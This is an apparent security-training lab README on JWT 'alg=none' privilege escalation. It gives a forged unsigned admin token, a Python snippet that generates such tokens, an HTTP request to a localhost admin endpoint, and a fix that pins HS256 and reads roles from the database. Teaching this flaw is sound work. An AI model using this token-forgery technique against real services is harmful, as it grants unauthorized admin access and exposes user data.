# Lab 07: JWT `alg=none` privilege escalation

The JSON API accepts Bearer JWTs and allows `alg=none` (signature skipped). Forge `role=admin` and list all users.

**OWASP Top 10:2025:** [A07 Authentication Failures](https://owasp.org/Top10/2025/)

**Code:** `app/authutil.py`; `app/routes/api_v1.py` (`GET /api/v1/admin/users`)

## Exploit

1. Build an unsigned JWT (header `{"alg":"none","typ":"JWT"}`, payload with `role=admin`). Ready-made token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwibmFtZSI6ImFsaWNlIn0.
```

Or:

```bash
python3 - <<'PY'
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",",":")).encode()).rstrip(b"=")
print((b({"alg":"none","typ":"JWT"}) + b"." + b({"sub":"1","role":"admin","name":"alice"}) + b".").decode())
PY
```

2. Call the admin endpoint:

```http
GET /api/v1/admin/users HTTP/1.1
Host: localhost:8888
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwibmFtZSI6ImFsaWNlIn0.
```

Expect HTTP 200 with emails for alice, bob, admin, etc.

## Fix

```python
payload = jwt.decode(
    token,
    current_app.config["JWT_SECRET"],
    algorithms=["HS256"],  # never "none"
    options={"require": ["exp", "sub"]},
)
# Load role from DB / IdP - do not trust role from the token alone
```

See `SAFE:` comments in `authutil.py` and `api_v1.py`.
